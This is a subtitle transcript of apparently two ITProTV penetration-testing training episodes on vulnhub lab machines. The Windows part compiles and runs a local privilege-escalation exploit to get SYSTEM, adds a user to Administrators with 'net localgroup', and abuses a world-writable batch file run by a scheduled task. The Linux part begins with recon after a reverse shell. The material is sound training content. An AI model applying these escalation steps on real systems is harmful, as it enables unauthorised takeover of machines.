00:15:15.428\n&gt;&gt; Underscore, thank you Michael.\n\n313\n00:15:15.428 --> 00:15:15.940\nThank you.\n\n314\n00:15:15.940 --> 00:15:17.013\nUnderscore is all over the place.\n\n315\n00:15:17.013 --> 00:15:18.992\n&gt;&gt; Or is it supposed to be a dash, though?\n\n316\n00:15:18.992 --> 00:15:19.850\nWhere is that?\n\n317\n00:15:19.850 --> 00:15:20.544\n&gt;&gt; Both of those?\n\n318\n00:15:20.544 --> 00:15:22.210\n&gt;&gt; Yeah, the GCC, yes.\n\n319\n00:15:22.210 --> 00:15:23.150\n&gt;&gt; Okay.\n\n320\n00:15:23.150 --> 00:15:25.619\n&gt;&gt; Or maybe, that's, they're not\nunderscores, they are dashes, that's my-\n\n321\n00:15:25.619 --> 00:15:26.495\n&gt;&gt; That's what I was thinking.\n\n322\n00:15:26.495 --> 00:15:27.390\n&gt;&gt; Yup.\n\n323\n00:15:27.390 --> 00:15:30.351\nI had dash right there,\nthis was also a problem.\n\n324\n00:15:30.351 --> 00:15:32.580\nEasy to do, just go back and fix it.\n\n325\n00:15:32.580 --> 00:15:36.350\nYou'll get an error just like we did and\nyou'll take a look and find the problem.\n\n326\n00:15:36.350 --> 00:15:39.573\nSo let's try that, there we go,\ncompile, no problem.\n\n327\n00:15:39.573 --> 00:15:41.740\nThe compile is no problem now, okay?\n\n328\n00:15:41.740 --> 00:15:44.138\n&gt;&gt; [LAUGH]\n&gt;&gt; Because I changed the stinking code.\n\n329\n00:15:44.138 --> 00:15:47.684\nThis gave me fits and\nI worked two hours on it with Justin.\n\n330\n00:15:47.684 --> 00:15:49.640\nLet me show you what the problem was.\n\n331\n00:15:49.640 --> 00:15:53.968\nIf I nano good old 3557.\n\n332\n00:15:53.968 --> 00:15:57.845\nWhat is it, 37755, 7755.c.\n\n333\n00:15:57.845 --> 00:16:03.138\nRight here at the top, here's the exploit\ncode Telling you what it works on,\n\n334\n00:16:03.138 --> 00:16:06.892\nsupport Windows 2003 SP2 X86, X86-64.\n\n335\n00:16:06.892 --> 00:16:09.292\nItanium, you name it, it worked on that.\n\n336\n00:16:09.292 --> 00:16:10.950\nWe tested it successfully.\n\n337\n00:16:10.950 --> 00:16:14.166\nLots of great notation.\n\n338\n00:16:14.166 --> 00:16:16.397\nThis person really did a great job.\n\n339\n00:16:16.397 --> 00:16:20.700\nExcept for one stinking thing was\nthat when you come down to right\n\n340\n00:16:20.700 --> 00:16:25.770\nat the start of this guy,\nthere's all the include statements.\n\n341\n00:16:25.770 --> 00:16:27.870\nDown in here, where is it?\n\n342\n00:16:27.870 --> 00:16:31.300\nRight here, this typedef long.\n\n343\n00:16:31.300 --> 00:16:34.860\nThis looked like this originally.\n\n344\n00:16:36.590 --> 00:16:38.140\nThat's what that looked like.\n\n345\n00:16:38.140 --> 00:16:40.025\nSo they set this as a DWORD.\n\n346\n00:16:41.740 --> 00:16:43.728\nThat did not work.\n\n347\n00:16:43.728 --> 00:16:45.330\nAnd I got compilation errors.\n\n348\n00:16:45.330 --> 00:16:51.010\nSo if I save this, Ctrl+O, and\nCtrl+X, save it out of there.\n\n349\n00:16:51.010 --> 00:16:52.270\nWe try to do the exact same thing.\n\n350\n00:16:52.270 --> 00:16:52.890\nI'll call it Net3.\n\n351\n00:16:52.890 --> 00:16:57.520\nLook at that, compilation errors.\n\n352\n00:16:57.520 --> 00:16:59.620\nThere you go, DWORD, NTSTATUS.\n\n353\n00:16:59.620 --> 00:17:00.960\nIt was freaking out.\n\n354\n00:17:00.960 --> 00:17:02.860\nAnd we're like, why is this happening?\n\n355\n00:17:02.860 --> 00:17:04.470\nWe were Google searching things.\n\n356\n00:17:04.470 --> 00:17:05.310\nAnd through Google searching,\n\n357\n00:17:05.310 --> 00:17:10.040\nwe found that it should have been\nan operational long and not DWORD.\n\n358\n00:17:10.040 --> 00:17:14.608\nSomebody just randomly passe said\nsomething about operational long.\n\n359\n00:17:14.608 --> 00:17:18.115\nAnd Justin was like, try changing\nthis to long instead of DWORD.\n\n360\n00:17:18.115 --> 00:17:20.700\nAnd boom, compilation.\n\n361\n00:17:20.700 --> 00:17:21.780\nSo that's great.\n\n362\n00:17:21.780 --> 00:17:22.863\nIt was great it compiled.\n\n363\n00:17:22.863 --> 00:17:24.923\nBut that doesn't mean\nwe had full execution.\n\n364\n00:17:24.923 --> 00:17:26.750\nSo you had to do that.\n\n365\n00:17:26.750 --> 00:17:31.640\nSo now that we have our compiled code,\ncuz I did that before I changed it.\n\n366\n00:17:31.640 --> 00:17:32.942\n&gt;&gt; Yeah.\n&gt;&gt; I have to go back and do it again.\n\n367\n00:17:32.942 --> 00:17:37.250\nWith Net2 or Net whatever,\nwe can do either.\n\n368\n00:17:37.250 --> 00:17:38.260\nYou need to copy that over.\n\n369\n00:17:38.260 --> 00:17:40.880\nI wanna just fire up my handy HTTP server.\n\n370\n00:17:40.880 --> 00:17:41.870\nFound out what the problem was.\n\n371\n00:17:41.870 --> 00:17:44.120\nIf you watched the previous show,\nwe had issues with that.\n\n372\n00:17:44.120 --> 00:17:45.770\nIt wasn't my server.\n\n373\n00:17:45.770 --> 00:17:48.300\nIt was the browser did not like it.\n\n374\n00:17:48.300 --> 00:17:50.350\nSo this browser works fine with it.\n\n375\n00:17:50.350 --> 00:17:53.962\nSo I will fire it up,\n\n376\n00:17:53.962 --> 00:17:59.700\npython -m SimpleHTTPServer,\n\n377\n00:17:59.700 --> 00:18:04.381\nI'll put it on 8080.\n\n378\n00:18:04.381 --> 00:18:04.931\nThere we go.\n\n379\n00:18:04.931 --> 00:18:06.350\nNow I'm listening on port 8080.\n\n380\n00:18:06.350 --> 00:18:13.490\nI can open up my remote desktop,\nfire up the browser, and hit OK here.\n\n381\n00:18:14.540 --> 00:18:23.562\nAnd just say,\n192.168.209.146 port 8080/net.exe.\n\n382\n00:18:23.562 --> 00:18:25.478\nThere we go, it says, couldn't find it.\n\n383\n00:18:25.478 --> 00:18:27.196\nMake sure I typed everything correctly.\n\n384\n00:18:27.196 --> 00:18:27.902\n&gt;&gt;

[LAUGH]\n&gt;&gt; Jump to my computer.\n\n393\n00:18:48.375 --> 00:18:51.693\nRight here, I put http://.\n\n394\n00:18:51.693 --> 00:18:55.195\nThe ping seemed to like that a whole\nlot better cuz there's the file.\n\n395\n00:18:55.195 --> 00:18:55.975\nLet's save that.\n\n396\n00:18:57.005 --> 00:18:58.045\nI'll just save it to my desktop.\n\n397\n00:18:59.300 --> 00:19:01.920\nAnd there we go, I can hit Close.\n\n398\n00:19:01.920 --> 00:19:03.890\nAnd now I have that guy.\n\n399\n00:19:03.890 --> 00:19:07.011\nAnd you'll notice I'm just User1.\n\n400\n00:19:07.011 --> 00:19:09.943\nIf I go to My Computer, hit Manage.\n\n401\n00:19:11.896 --> 00:19:14.505\nThere's Groups,\nthere's Administrators right there.\n\n402\n00:19:14.505 --> 00:19:18.063\nUser1 is not in there, Cancel.\n\n403\n00:19:18.063 --> 00:19:20.700\nSo I have no administrative privileges.\n\n404\n00:19:20.700 --> 00:19:26.659\nSo now if I open up a command prompt and\nI cd into the desktop.\n\n405\n00:19:29.120 --> 00:19:30.752\nMove this over just a bit.\n\n406\n00:19:30.752 --> 00:19:32.583\nCan you guys see that very well?\n\n407\n00:19:32.583 --> 00:19:33.169\n&gt;&gt; Bump it up just a hair a little bit.\n\n408\n00:19:33.169 --> 00:19:36.530\n&gt;&gt; Yeah, let me just scroll in here.\n\n409\n00:19:37.840 --> 00:19:38.550\nHow's that look, Mike?\n\n410\n00:19:38.550 --> 00:19:39.190\n&gt;&gt; Much better.\n\n411\n00:19:39.190 --> 00:19:44.006\n&gt;&gt; All right, and\nnow I should be able to type in Net.exe.\n\n412\n00:19:44.006 --> 00:19:45.660\nActually, first, let's try whoami.\n\n413\n00:19:46.880 --> 00:19:48.567\nThere it is, user1.\n\n414\n00:19:48.567 --> 00:19:54.807\nAnd now /Net,\nI'm doing Linux [LAUGH] Net.exe.\n\n415\n00:19:54.807 --> 00:19:59.559\nAnd now you'll notice that my\nprompt has changed to system32.\n\n416\n00:19:59.559 --> 00:20:03.930\nWhoami, NT authority system.\n\n417\n00:20:03.930 --> 00:20:05.634\nSo I've elevated my privileges.\n\n418\n00:20:05.634 --> 00:20:08.790\nNow I can do things like,\nsay, I don't know.\n\n419\n00:20:08.790 --> 00:20:10.251\nLet's see here.\n\n420\n00:20:10.251 --> 00:20:16.114\nNet localgroup administrators,\n\n421\n00:20:16.114 --> 00:20:21.174\nand we'll say user1 /add.\n\n422\n00:20:23.840 --> 00:20:25.250\nNow, he's a part of\nthe administrators group.\n\n423\n00:20:25.250 --> 00:20:28.040\nSo let me scroll out just a hair.\n\n424\n00:20:29.250 --> 00:20:35.250\nIf I go back into My Computer, hit Manage.\n\n425\n00:20:35.250 --> 00:20:40.517\nLook at the Local Users and\nGroups &gt; Administrators, there's user1.\n\n426\n00:20:40.517 --> 00:20:41.725\nSo we successfully added him.\n\n427\n00:20:41.725 --> 00:20:43.520\nWe've escalated our privileges.\n\n428\n00:20:43.520 --> 00:20:45.230\nAnd now we can do whatever we want.\n\n429\n00:20:46.330 --> 00:20:47.490\nYes, that's a lot of work.\n\n430\n00:20:47.490 --> 00:20:49.420\nBut we've reached the mountain top.\n\n431\n00:20:49.420 --> 00:20:50.560\n&gt;&gt; We have, absolutely.\n\n432\n00:20:50.560 --> 00:20:54.260\nI mean, at this point, you can pretty much\ndo whatever you want with that system.\n\n433\n00:20:54.260 --> 00:20:57.150\n&gt;&gt; Yeah, it's ours to own and\nplay with as we like.\n\n434\n00:20:57.150 --> 00:20:59.154\nAll right, let me start closing\nall this stuff down here.\n\n435\n00:20:59.154 --> 00:21:02.110\nLet me cancel this and close that.\n\n436\n00:21:02.110 --> 00:21:03.980\nAnd very simple,\nall I have to do is have that exploit.\n\n437\n00:21:03.980 --> 00:21:06.789\nSo any time I want administrative\nprivileges, even if\n\n438\n00:21:06.789 --> 00:21:10.403\nthey remove me from an administors,\nI could just rerun that exploit.\n\n439\n00:21:10.403 --> 00:21:13.728\n&gt;&gt; Yeah, cuz you might have\na restrictive Group Policy on a domain\n\n440\n00:21:13.728 --> 00:21:15.556\nbased Windows operating system.\n\n441\n00:21:15.556 --> 00:21:17.160\nThey might be doing Restricted Groups.\n\n442\n00:21:17.160 --> 00:21:20.230\nBut remember, Restricted Groups\ndon't prevent you from adding.\n\n443\n00:21:20.230 --> 00:21:23.597\nIt's just going to check\nthat membership list.\n\n444\n00:21:23.597 --> 00:21:26.110\nAnd make sure it's accurate every\ntime Group Policy refreshes.\n\n445\n00:21:26.110 --> 00:21:27.687\nSo you can slip yourself in.\n\n446\n00:21:27.687 --> 00:21:28.524\nDo what you need to do.\n\n447\n00:21:28.524 --> 00:21:30.190\nGet out, and you're good to go.\n\n448\n00:21:30.190 --> 00:21:32.694\n&gt;&gt; So Mike, yeah, a really cool exploit.\n\n449\n00:21:32.694 --> 00:21:33.600\nThat was awesome to watch.\n\n450\n00:21:33.600 --> 00:21:35.910\nWe get to jump our privileges there.\n\n451\n00:21:35.910 --> 00:21:38.492\nAnd technically,\nit is a type of local exploit.\n\n452\n00:21:38.492 --> 00:21:43.520\nCuz we downloaded it, I guess,\ninto the machine and ran it locally.\n\n453\n00:21:43.520 --> 00:21:44.970\nCuz I had that RDP session.\n\n454\n00:21:44.970 --> 00:21:48.910\nBut there's another way which you\ncan do local privilege escalation.\n\n455\n00:21:48.910 --> 00:21:53.860\nThat would have run as well if\nI had done a shell exploit.\n\n456\n00:21:53.860 --> 00:21:56.513\nAnd I had that shell,\nI could still load the file.\n\n457\n00:21:56.513 --> 00:21:58.890\nTechnically, it's still local,\nbut you're remoted into the box.\n\n458\n00:21:58.890 --> 00:22:02.660\nSo, I guess, however, and six on one,\nhalf a dozen of the other.\n\n459\n00:22:02.660 --> 00:22:05.340\n&gt;&gt; So this one like the one we're getting\nready to do might be more like if I had\n\n460\n00:22:05.340 --> 00:22:06.600\nphysical access to a machine.\n\n461\n00:22:06.600 --> 00:22:10.729\n&gt;&gt; Right, or again with the RDP, something\nwhere you can take a look at the files.\n\n462\n00:22:12.830 --> 00:22:14.194\nAgain, six on one, half a dozen.\n\n463\n00:22:14.194 --> 00:22:16.270\nIt just depends on how\nyou're looking at it.\n\n464\n00:22:16.270 --> 00:22:21.810\nLocal or remote file exploitation,\njust a matter of perspective apparently.\n\n465\n00:22:21.810 --> 00:22:25.313\nThat being said,\nlet's jump into my Windows 7 machine.\n\n466\n00:22:25.313 --> 00:22:31.449\nI'm logged as, again, a local user,\nuser1, has no file permissions.\n\n467\n00:22:31.449 --> 00:22:36.600\nLet's go over here and\nget into My Computer, hit Manage.\n\n468\n00:22:36.600 --> 00:22:38.780\nAnd look, so\nyou can't even manage the thing.\n\n469\n00:22:38.780 --> 00:22:40.320\nCuz I'm not an administrator.\n\n470\n00:22:40.320 --> 00:22:42.270\nSo that proves that fact.\n\n471\n00:22:42.270 --> 00:22:44.286\nDid some poking around looking for stuff.\n\n472\n00:22:44.286 --> 00:22:46.445\nYou gotta remember, administrators,\nas great as they are,\n\n473\n00:22:46.445 --> 00:22:48.020\ndon't always do things correctly.\n\n474\n00:22:48.020 --> 00:22:53.530\nSometimes, they set wrong permissions on\nthings that could be used as exploits.\n\n475\n00:22:53.530 --> 00:22:55.898\nThings that run as themselves.\n\n476\n00:22:55.898 --> 00:22:59.040\nBut you have permission\nto maybe modify them.\n\n477\n00:22:59.040 --> 00:23:01.430\nBatch scripts, any kind of scripts\nthat they may have created.\n\n478\n00:23:01.430 --> 00:23:05.200\nIf they set the incorrect permissions\non it, can give everybody access.\n\n479\n00:23:05.200 --> 00:23:08.726\nBut it runs as the administrator\nthrough the scheduled task.\n\n480\n00:23:08.726 --> 00:23:13.456\nThen if you modify that, well, then you'll\nbe able to run that, whatever it is,\n\n481\n00:23:13.456 --> 00:23:16.840\nas the administrator instead\nof your local permissions.\n\n482\n00:23:16.840 --> 00:23:19.430\n&gt;&gt; I can attest to the fact,\nI've done that myself before.\n\n483\n00:23:19.430 --> 00:23:23.430\nIf you're launching some program and it's\ngot a service account that you create.\n\n484\n00:23:23.430 --> 00:23:25.770\nYou create it as a standard user and\nthe program won't run.\n\n485\n00:23:25.770 --> 00:23:30.170\nNow you gotta figure out, what does that\naccount need for this program to run?\n\n486\n00:23:30.170 --> 00:23:32.037\nAnd sometimes,\nit's such a pain that you're like,\n\n487\n00:23:32.037 --> 00:23:33.580\nI'll just give it administrative access.\n\n488\n00:23:33.580 --> 00:23:34.850\nIt's a service account.\n\n489\n00:23:34.850 --> 00:23:37.207\nAnd yes, now the program runs.\n\n490\n00:23:37.207 --> 00:23:39.455\nBut that service account,\nif ever compromised,\n\n491\n00:23:39.455 --> 00:23:41.280\nis an administrator on a local machine.\n\n492\n00:23:41.280 --> 00:23:42.540\n&gt;&gt; That's the problem.\n\n493\n00:23:42.540 --> 00:23:45.240\nWe as administrators,\nwe don't do everything perfectly.\n\n494\n00:23:45.240 --> 00:23:48.564\nAnd we're looking for those imperfections\nso that we can exploit them.\n\n495\n00:23:48.564 --> 00:23:51.021\nSo, as I said, I was kicking around and\n\n496\n00:23:51.021 --> 00:23:54.232\nI went into the Computer\nhere under File Explorer.\n\n497\n00:23:54.232 --> 00:24:00.250\nAnd say, Computer,\nI was digging through the user profiles.\n\n498\n00:24:00.250 --> 00:24:02.089\nAnd I found, of course\nthe default one's the hidden one.\n\n499\n00:24:02.089 --> 00:24:04.323\nI had to make that be able to be shown.\n\n500\n00:24:04.323 --> 00:24:07.598\nAnd if I looked in the Desktop,\nI found this showme.bat.\n\n501\n00:24:07.598 --> 00:24:10.980\nAnd if I double-clicked it,\nit runs, that's cool.\n\n502\n00:24:10.980 --> 00:24:12.680\nIf I edit it, it's just a whoami.\n\n503\n00:24:12.680 --> 00:24:14.680\nSo just a script basically, right?\n\n504\n00:24:14.680 --> 00:24:17.950\nA batch file that is running something.\n\n505\n00:24:17.950 --> 00:24:23.632\nBut I also realized that it was\nrunning every so often, right?\n\n506\n00:24:23.632 --> 00:24:25.930\nSo that was the bad part about it.\n\n507\n00:24:25.930 --> 00:24:27.190\nThat it was running every so often.\n\n508\n00:24:27.190 --> 00:24:30.940\nAnd I have, if I go to the Properties and\n\n509\n00:24:32.150 --> 00:24:35.190\nlook at Security,\neveryone has full control.\n\n510\n00:24:36.290 --> 00:24:37.530\nThat's bad.\n\n511\n00:24:37.530 --> 00:24:41.270\nThat's bad because this thing is running\n\n512\n00:24:41.270 --> 00:24:44.650\nin a scheduled task that\nthe administrator set up, okay?\n\n513\n00:24:44.650 --> 00:24:47.860\nSo what I can do, is I can go in here,\nand edit, and say,\n\n514\n00:24:47.860 --> 00:24:50.060\nyou know what, let's edit this.\n\n515\n00:24:50.060 --> 00:24:54.783\nLet's say, net user or local groups,\nthat's why I'll do, group,\n\n516\n00:24:54.783 --> 00:24:58.320\nadministrators, right,\nit's administrators?\n\n517\n00:24:58.320 --> 00:25:00.994\nYeah, it's administrators.\n\n518\n00:25:00.994 --> 00:25:07.050\nUser1/add, and then I will Save that.\n\n519\n00:25:07.050 --> 00:25:09.706\nFile &gt; Save,\nwhich it gave me no problem about.\n\n520\n00:25:09.706 --> 00:25:11.846\nAnd we're good.\n\n521\n00:25:11.846 --> 00:25:15.820\nNow, since this is running as\na scheduled task, every so\n\n522\n00:25:15.820 --> 00:25:18.570\noften that task will fire off and\nrun that script.\n\n523\n00:25:18.570 --> 00:25:23.970\nThis could be, look through files, and\nmaybe make a backup of a directory.\n\n524\n00:25:23.970 --> 00:25:27.190\nIt could be anything that the\nadministrator set up to run as themselves.\n\n525\n00:25:27.190 --> 00:25:28.710\nBut if, you know what,\n\n526\n00:25:28.710 --> 00:25:32.770\nMike needs to add his files to that,\nI'll just give him permissions.\n\n527\n00:25:32.770 --> 00:25:36.064\nAnd it's easy, like you said, I'll just\nadd everyone, no one knows about it.\n\n528\n00:25:36.064 --> 00:25:37.000\n&gt;&gt; [LAUGH] Yep.\n\n529\n00:25:37.000 --> 00:25:39.830\n&gt;&gt; Little do they know, people like us\nare out there looking for these things.\n\n530\n00:25:39.830 --> 00:25:44.950\nAll right, so I'm gonna log in as\nthe administrator so I can show you.\n\n531\n00:25:44.950 --> 00:25:47.647\nLet me log off.\n\n532\n00:25:47.647 --> 00:25:51.750\n[COUGH] So you can see when that's\ngonna happen and watch that happen.\n\n533\n00:25:52.980 --> 00:25:56.111\nLog in.\n\n534\n00:25:56.111 --> 00:25:58.020\nHopefully I typed that correctly,\nlooks like I did.\n\n535\n00:26:00.470 --> 00:26:06.520\nAnd if I go to Task Scheduler,\nand look in scheduled tasks.\n\n536\n00:26:07.920 --> 00:26:13.330\nThere's my task,\nit says the next run time will be at 3:50.\n\n537\n00:26:13.330 --> 00:26:16.925\nOoh, it should be running any time now.\n\n538\n00:26:16.925 --> 00:26:20.094\nLet's see here, yeah,\nit probably just fired off.\n\n539\n00:26:20.094 --> 00:26:26.971\nAnd if we refresh this, We'll see,\nyep, and now, let's jump over to,\n\n540\n00:26:26.971 --> 00:26:30.880\nnow, you'll notice I didn't do\nanything in local users or groups.\n\n541\n00:26:30.880 --> 00:26:32.210\nNothing has happened.\n\n542\n00:26:32.210 --> 00:26:35.090\nMy User1 did modify that batch file.\n\n543\n00:26:36.870 --> 00:26:38.660\nIf we go to Computer and hit Manage.\n\n544\n00:26:40.190 --> 00:26:44.421\nAnd we hit Local Users and Groups,\nthere's the group administrators.\n\n545\n00:26:44.421 --> 00:26:46.290\nLook who's sitting pretty.\n\n546\n00:26:46.290 --> 00:26:50.205\n&gt;&gt; Dum dum dum.\n&gt;&gt; User1, there she blows right there.\n\n547\n00:26:50.205 --> 00:26:52.810\nUser1 is now a full blown administrator.\n\n548\n00:26:52.810 --> 00:26:56.180\nThat user just had to sit there and\ntwiddle their thumbs and wait for\n\n549\n00:26:56.180 --> 00:26:57.890\nthat scheduled task to run.\n\n550\n00:26:57.890 --> 00:26:59.950\nOnce it did, well, there they are.\n\n551\n00:26:59.950 --> 00:27:03.107\nAnd they were able because of\nincorrectly set permissions and\n\n552\n00:27:03.107 --> 00:27:05.788\nat the fact that it was\nrunning as an administrator.\n\n553\n00:27:05.788 --> 00:27:10.082\nGave it those administrator privileges for\njust the moment it needed, so\n\n554\n00:27:10.082 --> 00:27:12.670\nthat it could add them\nto the right account.\n\n555\n00:27:12.670 --> 00:27:14.380\n&gt;&gt; All right Daniel,\nimpressive stuff there.\n\n556\n00:27:14.380 --> 00:27:18.150\nWe got to see a couple of different\nways we could go about escalating our\n\n557\n00:27:18.150 --> 00:27:20.900\ncredentials or\nprivileges within a Windows system.\n\n558\n00:27:20.900 --> 00:27:23.920\nSo we appreciate that,\nfantastic demonstrations.\n\n559\n00:27:23.920 --> 00:27:26.210\nHope everybody out there\nenjoyed watching this one.\n\n560\n00:27:26.210 --> 00:27:28.980\nSigning off for ITProTV,\nI've been your host Mike Rodrick.\n\n561\n00:27:28.980 --> 00:27:29.870\n&gt;&gt; And I'm Daniel Lowrie.\n\n562\n00:27:29.870 --> 00:27:32.117\n&gt;&gt; And we'll see you next time.\n\n563\n00:27:32.117 --> 00:27:38.020\n[MUSIC]\n\n564\n00:27:38.020 --> 00:27:41.422\n&gt;&gt; Thank you for watching ITProTV.\n\n",

Talking to you live from San Francisco-\n&gt;&gt; Photoshop.\n\n4\n00:00:07.320 --> 00:00:12.590\n&gt;&gt; You're watching ITProTV.\n\n5\n00:00:12.590 --> 00:00:15.530\n&gt;&gt; Hello, welcome to another\nexciting episode here at ITProTV.\n\n6\n00:00:15.530 --> 00:00:17.340\nI'm your host, Mike Rodrick.\n\n7\n00:00:17.340 --> 00:00:19.760\nToday we're doing penetration testing.\n\n8\n00:00:19.760 --> 00:00:24.520\nAnd in this episode, we're gonna be taking\na look at Linux Privilege Escalation.\n\n9\n00:00:24.520 --> 00:00:28.290\nWe've already taken a look at what it\ntakes to do that in a Windows environment.\n\n10\n00:00:28.290 --> 00:00:32.040\nNow we're gonna show you what we need\nto do to escalate our credentials or\n\n11\n00:00:32.040 --> 00:00:36.910\nprivileges within Linux and here to\ndemonstrate for us is Mr. Daniel Lowrie.\n\n12\n00:00:36.910 --> 00:00:37.620\nWelcome back Daniel.\n\n13\n00:00:37.620 --> 00:00:38.750\n&gt;&gt; Mike so glad to be back.\n\n14\n00:00:38.750 --> 00:00:40.830\nWe have an action packed episode for\ntoday.\n\n15\n00:00:40.830 --> 00:00:45.400\nIf you watch the Windows Pros escalation,\nyou are probably primed and ready to go.\n\n16\n00:00:45.400 --> 00:00:48.080\nOkay I've worked at Windows,\nI think I can handle that.\n\n17\n00:00:48.080 --> 00:00:51.650\nLinux might not be your forte or maybe\nyou're like yes, finally it's Linux time.\n\n18\n00:00:51.650 --> 00:00:54.370\nI'm gonna totally root that box, right?\n\n19\n00:00:54.370 --> 00:00:57.390\nEither way you should be\nglad to be here I know I am.\n\n20\n00:00:57.390 --> 00:00:59.720\nBecause we have a lot\nof ground to cover and\n\n21\n00:00:59.720 --> 00:01:01.710\na very short amount of time to do that.\n\n22\n00:01:01.710 --> 00:01:03.790\nSo I said we just jump\nright into the fray, so\n\n23\n00:01:03.790 --> 00:01:09.590\nprivileges escalation remember is all\nabout going from a non-route user or\n\n24\n00:01:09.590 --> 00:01:13.290\nnon administrative user and\ngaining more privileges.\n\n25\n00:01:13.290 --> 00:01:17.970\nOr even below that,\njumping up to someone with at least more\n\n26\n00:01:17.970 --> 00:01:22.360\nprivileges than yourself ultimately\nlooking for the Apex of the mountain,\n\n27\n00:01:22.360 --> 00:01:24.760\nwhich is the root core user.\n\n28\n00:01:24.760 --> 00:01:29.320\nSo that's what we're trying to do\njust like in Windows we can find\n\n29\n00:01:29.320 --> 00:01:33.320\nout maybe there's a kernel exploit for\nthe Linux system that you're in and\n\n30\n00:01:33.320 --> 00:01:38.160\ncan go to Exploit-DB or use search plot\nto look for that really easy ways.\n\n31\n00:01:38.160 --> 00:01:40.690\nIf you jump into my machine\nreally quickly, I already have.\n\n32\n00:01:40.690 --> 00:01:42.110\nWe're kinda picking up,\n\n33\n00:01:42.110 --> 00:01:45.550\nsetting the stage, we're picking up where\nwe left off with the pound lab exercise.\n\n34\n00:01:45.550 --> 00:01:49.200\nRemember the good folks at\nvulnhub who let us use these.\n\n35\n00:01:49.200 --> 00:01:51.650\nWe downloaded and are using them for\ndemonstration purposes.\n\n36\n00:01:51.650 --> 00:01:54.820\nSo jump over to vulnhub.com if\nyou have not done so already.\n\n37\n00:01:54.820 --> 00:01:59.555\nFire up homelab, get to the part where\nwe left off where we did an LFI or\n\n38\n00:01:59.555 --> 00:02:03.162\nan RFI, I can never remember,\nit was one of the two.\n\n39\n00:02:03.162 --> 00:02:04.510\nI think it was an LFI.\n\n40\n00:02:04.510 --> 00:02:11.240\nIt was a local file inclusion that we\nused to exploit and gain a root shell or\n\n41\n00:02:11.240 --> 00:02:16.100\nnot a root shell, but we gained a shell to\nthat system, I'm at that point right now.\n\n42\n00:02:16.100 --> 00:02:20.039\nIf I do a who am I,\nyou'll see I'm www-data,\n\n43\n00:02:20.039 --> 00:02:26.030\nwhich is the service account for\ntheir user, right?\n\n44\n00:02:26.030 --> 00:02:29.710\nSo what I wanna do is gain some\ninformation cuz maybe that can be helpful,\n\n45\n00:02:29.710 --> 00:02:35.090\nthings like click and cut,\n/etc/issue like that and\n\n46\n00:02:36.150 --> 00:02:39.640\nthis is a Debian Linux 8.\n\n47\n00:02:39.640 --> 00:02:41.640\nOkay I know it's a Debian system.\n\n48\n00:02:41.640 --> 00:02:46.580\nI can maybe run that through search split\nor db or exploit db, find something.\n\n49\n00:02:46.580 --> 00:02:51.610\nWould be nice to have a little\nmore information to try uname-a.\n\n50\n00:02:51.610 --> 00:02:52.800\nYeah, that's more like it.\n\n51\n00:02:52.800 --> 00:02:54.650\nSo now I'm getting version numbers.\n\n52\n00:02:54.650 --> 00:03:00.310\nLook it's Debian 3.16.7,\nI can attack that vector.\n\n53\n00:03:00.310 --> 00:03:03.250\nI can look for, just like what\nwe did with the Windows system.\n\n54\n00:03:03.250 --> 00:03:06.120\nBut since we already did that,\nwe're gonna move on.\n\n55\n00:03:06.120 --> 00:03:11.360\nWe're gonna kind of pick up where we left\noff with Windows about misconfigured\n\n56\n00:03:11.360 --> 00:03:12.370\ninformation, right?\n\n57\n00:03:12.370 --> 00:03:13.960\nMisconfigured permissions.\n\n58\n00:03:13.960 --> 00:03:15.580\nThat's typically where you're gonna go.\n\n59\n00:03:15.580 --> 00:03:19.050\nNot that you can't totally use\nan exploit and make that happen.\n\n60\n00:03:19.050 --> 00:03:20.400\nYou sure can.\n\n61\n00:03:20.400 --> 00:03:23.630\nBut I just wanna continue, cuz that's\nwhere I wanna reiterate these things.\n\n62\n00:03:23.630 --> 00:03:25.140\nSo let's see here.\n\n63\n00:03:26.350 --> 00:03:27.640\nLet's start the lab.\n\n64\n00:03:27.640 --> 00:03:29.000\nWe did the whoami.\n\n65\n00:03:29.000 --> 00:03:30.256\nWe know that we're running as data.\n\n66\n00:03:30.256 --> 00:03:37.820\nLet's do an ls and wow,\ntotally it must be, let's do a pwd.\n\n67\n00:03:37.820 --> 00:03:39.650\nYeah, I'm at the root directory.\n\n68\n00:03:39.650 --> 00:03:42.930\nSomebody changed the /home, do and ls.\n\n69\n00:03:43.990 --> 00:03:48.730\nYeah, that's right remember we found\nthe list of users in our My SQL Database.\n\n70\n00:03:48.730 --> 00:03:49.930\nRemember that?\n\n71\n00:03:49.930 --> 00:03:54.620\nAwesome, so they all are users on this\nsystem, and that's how we logged in,\n\n72\n00:03:54.620 --> 00:03:59.380\nas I think we logged in as Kent,\nand uploaded our malicious shell.\n\n73\n00:03:59.380 --> 00:04:00.350\nAnd gave us that reverse shell.\n\n74\n00:04:01.420 --> 00:04:03.750\nLet's see if there's anything\ninside of these guys.\n\n75\n00:04:05.590 --> 00:04:08.680\nI'm logged in as kent, maybe I can,\nI'm not logged in as kent.\n\n76\n00:04:08.680 --> 00:04:10.230\nI'm logged in as www-data.\n\n77\n00:04:10.230 --> 00:04:11.286\nLet's try to move to kent.\n\n78\n00:04:13.251 --> 00:04:14.870\nCan't cd to kent.\n\n79\n00:04:14.870 --> 00:04:18.400\nOkay, that means there's permissions\non that, I can't get to it.\n\n80\n00:04:18.400 --> 00:04:20.330\nMaybe if I can su.\n\n81\n00:04:20.330 --> 00:04:21.390\nMust be run from terminal.\n\n82\n00:04:21.390 --> 00:04:25.723\nThis is something that you'll encounter\nfrom time to time, we'll get this error,\n\n83\n00:04:25.723 --> 00:04:27.137\nmust be run from terminal.\n\n84\n00:04:27.137 --> 00:04:31.641\nThere is a good way to get around with\nthis,we use our good friend Python\n\n85\n00:04:31.641 --> 00:04:33.076\nto push this.\n\n86\n00:04:33.076 --> 00:04:37.375\nWhat is happening is this is not seeing\nas you logged in in a normal virtual\n\n87\n00:04:37.375 --> 00:04:40.061\nterminal, this is like\nstrange thing to it.\n\n88\n00:04:40.061 --> 00:04:45.075\nSo we need to on a because\nthis is just shell right,\n\n89\n00:04:45.075 --> 00:04:49.372\nthis is just sh, it's not dash so\nwe wanna elevate that,\n\n90\n00:04:49.372 --> 00:04:53.150\nwanna move to that so\nlet's use Python to do that.\n\n91\n00:04:54.565 --> 00:04:56.680\nYou'll wanna write this down,\nthis will be in the show notes for\n\n92\n00:04:56.680 --> 00:05:00.030\nyou because this is something that\nyou will eventually memorize but\n\n93\n00:05:00.030 --> 00:05:01.640\nif you haven't done it before.\n\n94\n00:05:01.640 --> 00:05:03.810\nAnd I think it's also on pentestmonkey.\n\n95\n00:05:03.810 --> 00:05:05.830\nPentestmonkey, great site, 